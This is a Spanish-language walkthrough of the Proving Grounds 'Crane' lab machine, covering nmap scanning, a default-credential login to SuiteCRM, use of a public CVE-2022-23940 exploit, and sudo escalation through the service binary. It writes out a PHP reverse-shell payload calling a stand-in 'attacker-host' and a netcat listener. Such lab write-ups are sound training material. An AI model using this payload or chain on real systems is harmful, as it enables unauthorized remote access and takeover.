# Crane

## Descripción

Dificultad: intermedia (valorada como easy)

En esta maquina de Proving Grounds Practice, veremos la explotación del software SuiteCRM a través de un exploit publico y una escalada de privilegios aprovechándonos de permisos sobre un binario que es posible ejecutar con sudo.

## Escaneo y Análisis de Vulnerabilidades

Iniciamos realizando un escaneo con nmap sobre la maquina crane

```bash
nmap -p- --open -T4 -Pn -n -vvv -sS 192.168.250.146  -oG allPorts
```

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png)

Exportamos los resultados en formato grepeable para poder copiar y pegar los puertos obtenidos en un nuevo escaneo a través de la función extracPorts.

Esta función es un extra que podéis añadir a vuestra zshrc para agilizar vuestros escaneos.

Una vez en vuestra zshrc debeis cerrar la terminal y abrir una nueva para que se completen los cambios.

```bash
# Funcion extracPorts
# Extract nmap information
function extractPorts(){
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
    echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
    echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
    echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
    cat extractPorts.tmp; rm extractPorts.tmp
}

```

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png)

Nos interesa el puerto 80 del cual obtendremos mas información en el siguiente escaneo.

```bash
nmap -p22,80,3306,33060 -sCV 192.168.250.146 -oN target
```

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png)

Vemos que en el puerto 80 hay un servidor apache, por lo que pasamos a ver su contenido.

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png)

Nos encontramos ante un login, lo primero que se me ocurre es probar credenciales por defecto como admin:admin y… 

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png)

Exito!

## Explotación

Tras obtener unas credenciales validas he pasado a buscar si existe algún exploit publico para la versión de este software y encontré el siguiente.

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png)

Exploit:

[https://github.com/manuelz120/CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)

Ejecutando la siguiente linea de comandos obtenemos la reverse shell

```bash
# Nos ponemos a la escucha
nc -nlvp 80

# Ejecutamos exploit
./exploit.py -u admin -p admin --payload "php -r '\$sock=fsockopen(\"attacker-host\", 80); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
```

y voila!

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png)

Tras realizar un tratamiento de la tty

```bash
# tratamiento de la tty
script /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 59 columns 236

```

La primera flag se encuentra en /var/www

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png)

## Escalda de privilegios

si comprobamos los permisos sudo del usuario vemos que podemos ejecutar el binario service con sudo.

```bash
sudo -l
```

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png)

En la siguiente web encontramos como podemos explotar este binario con sudo

[https://gtfobins.github.io/gtfobins/service/#sudo](https://gtfobins.github.io/gtfobins/service/#sudo)

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png)

Ejecutamos y…

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png)

La flag se encuentra en /root

![Untitled](Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png)

Maquina Crane Pwned!

